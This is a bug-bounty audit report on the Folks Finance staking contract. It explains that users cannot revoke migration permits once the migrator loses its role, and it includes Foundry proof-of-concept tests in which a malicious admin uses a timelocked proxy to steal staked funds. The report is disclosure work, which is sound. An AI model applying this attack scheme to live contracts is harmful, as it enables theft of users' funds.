# 69031 sc low user cannot revoke permission from migrator if it does not have migrator role&#x20;

**Submitted on Mar 12th 2026 at 12:41:30 UTC by @Audittens for** [**Audit Comp | Folks Finance: Staking Contracts**](https://immunefi.com/audit-competition/audit-comp-folks-finance-staking-contracts)

* **Report ID:** #69031
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/Folks-Finance/folks-staking-contracts/blob/main/src/Staking.sol>
* **Impacts:**
  * Contract fails to deliver promised returns, but doesn't lose value
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

### Brief/Intro

Function `Staking::setMigrationPermit` [requires `_migrator` to have `MIGRATOR_ROLE`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L78) even when a user attempts to revoke permission. This violates the promise: ["*The permission can be revoked **at any time** by calling `setMigrationPermit(migratorAddress, false)`*"](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/README.md?plain=1#L140C72-L140C169).

Moreover, this behavior enables a malicious admin to steal users' funds.

### Vulnerability Details

Function `Staking::setMigrationPermit(address _migrator, bool _isMigrationPermitted)` allows users to grant (`_isMigrationPermitted = true`) or revoke (`_isMigrationPermitted = false`) permission to migrate their positions using `_migrator`. However, [in both cases it requires `hasRole(MIGRATOR_ROLE, _migrator)`](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L78).

Consider the following scenario:

1. Admin grants `MIGRATOR_ROLE` to Migrator.
2. User grants migration permission to Migrator.
3. Admin revokes `MIGRATOR_ROLE` from Migrator.
4. User attempts to revoke permission from Migrator but cannot — **this violates the promise**: ["*The permission can be revoked **at any time** by calling `setMigrationPermit(migratorAddress, false)`*"](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/README.md?plain=1#L140C72-L140C169).

Additionally, this issue can allow a malicious admin to steal users' funds. Consider the following scenario:

1. Admin deploys an upgradeable Migrator contract with a good implementation and the ability to upgrade the implementation with a **30-day timelock**.
2. Admin grants `MIGRATOR_ROLE` to the Migrator.
3. User grants permission to the Migrator, trusting the timelock: if the admin upgrades the Migrator, the user expects to have **30 days to revoke permission**.
4. Admin revokes `MIGRATOR_ROLE` from the Migrator and schedules an upgrade to a malicious implementation that steals users' funds.
5. The user observes this upgrade but **cannot revoke permission**, because the Migrator no longer has `MIGRATOR_ROLE`.
6. After 30 days, the admin atomically grants `MIGRATOR_ROLE` back to the Migrator, completes the upgrade, and steals the user's funds via the malicious Migrator implementation.

### Impact Details

There are **two impacts**:

#### 1. \[Critical] Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

A malicious admin can steal users' funds.

Note that this attack requires a malicious admin, but it is **still in scope**, because by design the admin only has the privilege to:

* authorize potential migrators

but **does not have privileges to**:

* prevent users from revoking their permissions, or
* steal users' funds.

Relevant program rules:

> Default Out of Scope and rules Impacts caused by attacks requiring access to privileged addresses (including, but not limited to: governance and strategist contracts) **without additional modifications to the privileges attributed**

> What addresses would you consider any bug report requiring their involvement to be out of scope, as long as **they operate within the privileges attributed to them**? Default admin, manager, pauser, migrator.

#### 2. \[Low] Contract fails to deliver promised returns, but doesn't lose value

The contract violates the documented guarantee: ["*The permission can be revoked **at any time** by calling `setMigrationPermit(migratorAddress, false)`*"](https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/README.md?plain=1#L140C72-L140C169).

Importantly, this issue **does not require a malicious admin**.

## References

* <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/src/Staking.sol#L78>
* <https://github.com/Folks-Finance/folks-staking-contracts/blob/3131a2d/README.md?plain=1#L140C72-L140C169>

## Proof of Concept

The following codes simulate the scenarios described in the **Vulnerability Details** section.

Save them to files `src/test/PoC_1_AdminStealsFunds.t.sol` and `src/test/PoC_2_UnsetPermitFails.t.sol` respectively. Then run: `forge test --mc PoC* -vv`. This will produce the following logs:

```
Ran 1 test for src/test/PoC_2_UnsetPermitFails.t.sol:PoC_2_UnsetPermitFails
[PASS] test() (gas: 716069)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 3.26ms (1.69ms CPU time)

Ran 1 test for src/test/PoC_1_AdminStealsFunds.t.sol:PoC_1_AdminStealsFunds
[PASS] test() (gas: 2126888)
Logs:
  MaliciousMigratorImplementation received 1.082191780821917808e18 tokens and steals them
```

#### PoC for impact 1 (Critical)

```solidity
pragma solidity ^0.8.23;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Test, console} from "forge-std/Test.sol";
import {Staking} from "../Staking.sol";
import {IStakingV1} from "../interfaces/IStakingV1.sol";

contract Token is ERC20("TestToken", "TTKN") {}

contract MigratorProxy {
    address public immutable ADMIN = msg.sender;
    uint256 public constant TIMELOCK = 30 days;

    address public implementation;
    address public pendingImplementation;
    uint256 public pendingImplementationTimestamp;

    constructor(address _implementation) {
        implementation = _implementation;
    }

    function setPendingImplementation(address _pendingImplementation) external {
        require(msg.sender == ADMIN);
        pendingImplementation = _pendingImplementation;
        pendingImplementationTimestamp = block.timestamp + TIMELOCK;
    }

    function acceptImplementation() external {
        require(msg.sender == ADMIN);
        require(pendingImplementation != address(0));
        require(block.timestamp >= pendingImplementationTimestamp);
        implementation = pendingImplementation;
        pendingImplementation = address(0);
        pendingImplementationTimestamp = 0;
    }

    fallback(bytes calldata data) external payable returns (bytes memory) {
        (bool success, bytes memory returnData) = implementation.delegatecall(data);
        if (success)
            return returnData;
        else
            revert();
    }
}

contract GoodMigratorImplementation {
    function migrate(Staking staking, address user) external {
        uint256 balanceBefore = staking.TOKEN().balanceOf(address(this));
        staking.migratePositionsFrom(user);
        uint256 balanceAfter = staking.TOKEN().balanceOf(address(this));
        console.log("GoodMigratorImplementation received %e tokens and correctly migrates them", balanceAfter - balanceBefore);
    }
}

contract MaliciousMigratorImplementation {
    function migrate(Staking staking, address user) external {
        uint256 balanceBefore = staking.TOKEN().balanceOf(address(this));
        staking.migratePositionsFrom(user);
        uint256 balanceAfter = staking.TOKEN().balanceOf(address(this));
        console.log("MaliciousMigratorImplementation received %e tokens and steals them", balanceAfter - balanceBefore);
    }
}

contract PoC_1_AdminStealsFunds is Test {
    Token public token;
    Staking public staking;

    address public admin = makeAddr("admin");
    address public manager = makeAddr("manager");
    address public pauser = makeAddr("pauser");
    address public user = makeAddr("user");

    function setUp() public {
        token = new Token();
        staking = new Staking(admin, manager, pauser, address(token));
    }

    function test() public {
        // Manager sets up period and tops up staking contract
        vm.prank(manager);
        uint8 period = staking.addStakingPeriod(100 ether, 60 days, 60 days, 5000, true);
        deal(address(token), address(staking), 0.083 ether);

        // User stakes some tokens
        deal(address(token), user, 1 ether);
        vm.startPrank(user);
        token.approve(address(staking), 1 ether);
        staking.stake(
            period,
            1 ether,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: 60 days,
                maxUnlockDurationSeconds: 60 days,
                minAprBps: 0,
                referrer: address(0)
            })
        );
        vm.stopPrank();

        vm.startPrank(admin);
        // 1. Admin deploys an upgradeable Migrator contract with a good implementation and the ability to upgrade the implementation with a 30-day timelock.
        MigratorProxy migrator = new MigratorProxy(address(new GoodMigratorImplementation()));
        // 2. Admin grants `MIGRATOR_ROLE` to the Migrator.
        bytes32 MIGRATOR_ROLE = staking.MIGRATOR_ROLE();
        staking.grantRole(MIGRATOR_ROLE, address(migrator));
        vm.stopPrank();

        // 3. User grants permission to the Migrator, trusting the timelock: if the admin upgrades the Migrator, the user expects to have 30 days to revoke permission.
        vm.prank(user);
        staking.setMigrationPermit(address(migrator), true);

        // 4. Admin revokes `MIGRATOR_ROLE` from the Migrator and schedules an upgrade to a malicious implementation that steals users' funds.
        vm.startPrank(admin);
        staking.revokeRole(MIGRATOR_ROLE, address(migrator));
        migrator.setPendingImplementation(address(new MaliciousMigratorImplementation()));
        vm.stopPrank();

        // 5. The user observes this upgrade but cannot revoke permission, because the Migrator no longer has `MIGRATOR_ROLE`.
        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, address(migrator)));
        staking.setMigrationPermit(address(migrator), false);

        // 6. After 30 days, the admin atomically grants `MIGRATOR_ROLE` back to the Migrator, completes the upgrade, and steals the user's funds via the malicious Migrator implementation.
        vm.warp(block.timestamp + 30 days);
        vm.startPrank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));
        migrator.acceptImplementation();
        MaliciousMigratorImplementation(address(migrator)).migrate(staking, user);
        vm.stopPrank();
    }
}
```

#### PoC for impact 2 (Low)

```solidity
pragma solidity ^0.8.23;

import {ERC20} from "openzeppelin-contracts/contracts/token/ERC20/ERC20.sol";
import {Test} from "forge-std/Test.sol";
import {Staking} from "../Staking.sol";
import {IStakingV1} from "../interfaces/IStakingV1.sol";
import {MigratorV1} from "./MigratorV1.sol";
import {StakingV2Mock} from "./mock/StakingV2Mock.sol";

contract Token is ERC20("TestToken", "TTKN") {}

contract PoC_2_UnsetPermitFails is Test {
    Token public token;
    Staking public staking;
    StakingV2Mock public receiver;
    MigratorV1 public migrator;

    address public admin = makeAddr("admin");
    address public manager = makeAddr("manager");
    address public pauser = makeAddr("pauser");
    address public user = makeAddr("user");

    function setUp() public {
        token = new Token();
        staking = new Staking(admin, manager, pauser, address(token));
        receiver = new StakingV2Mock(token);
        migrator = new MigratorV1(staking, receiver);
    }

    function test() public {
        // Manager sets up period and tops up staking contract.
        vm.prank(manager);
        uint8 period = staking.addStakingPeriod(100 ether, 10, 10, 5000, true);
        deal(address(token), address(staking), 1000 ether);

        // User stakes some tokens.
        deal(address(token), user, 1 ether);
        vm.startPrank(user);
        token.approve(address(staking), 1 ether);
        staking.stake(
            period,
            1 ether,
            IStakingV1.StakeParams({
                maxStakingDurationSeconds: 10,
                maxUnlockDurationSeconds: 10,
                minAprBps: 0,
                referrer: address(0)
            })
        );
        vm.stopPrank();

        // 1. Admin grants `MIGRATOR_ROLE` to Migrator.
        bytes32 MIGRATOR_ROLE = staking.MIGRATOR_ROLE();
        vm.prank(admin);
        staking.grantRole(MIGRATOR_ROLE, address(migrator));

        // 2. User grants migration permission to Migrator.
        vm.prank(user);
        staking.setMigrationPermit(address(migrator), true);

        // 3. Admin revokes `MIGRATOR_ROLE` from Migrator.
        vm.prank(admin);
        staking.revokeRole(MIGRATOR_ROLE, address(migrator));

        // 4. User attempts to revoke permission from Migrator but cannot.
        vm.prank(user);
        vm.expectRevert(abi.encodeWithSelector(IStakingV1.MigratorNotFound.selector, address(migrator)));
        staking.setMigrationPermit(address(migrator), false);
    }
}
```
